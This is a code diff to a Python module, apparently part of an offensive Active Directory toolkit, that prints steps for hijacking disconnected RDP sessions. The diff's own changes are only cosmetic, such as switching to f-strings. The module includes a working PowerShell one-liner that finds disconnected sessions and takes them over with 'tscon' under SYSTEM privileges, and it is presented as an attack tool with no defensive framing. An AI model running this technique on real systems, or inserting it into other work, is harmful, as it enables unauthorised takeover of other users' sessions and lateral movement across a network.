@@ -1,6 +1,5 @@
-"""RDP session hijacking — take over disconnected RDP sessions."""
+"""RDP session hijacking  -  take over disconnected RDP sessions."""
 
-from __future__ import annotations
 from typing import Any
 
 MANIFEST = {
@@ -18,7 +17,7 @@ def run(args: Any) -> int:
     cred = ADCredential.from_args(args)
     target = getattr(args, "target", None)
 
-    print("[*] RDP Session Hijack: {}".format(target))
+    print(f"[*] RDP Session Hijack: {target}")
     print("[*] Requires SYSTEM privileges on target")
 
     commands = [
@@ -29,12 +28,12 @@ def run(args: Any) -> int:
 
     print("\n[*] RDP Hijack steps:")
     for desc, cmd in commands:
-        print("  {} : {}".format(desc, cmd))
+        print(f"  {desc} : {cmd}")
 
     generate = getattr(args, "generate", False) if hasattr(args, "generate") else False
     if generate:
         print("\n[*] PowerShell one-liner (requires SYSTEM):")
         ps = 'query user | ForEach-Object { if($_ -match "Disc") { $id = ($_ -split "\\s+")[3]; tscon $id /dest:console }}'
-        print("  {}".format(ps))
+        print(f"  {ps}")
 
     return 0
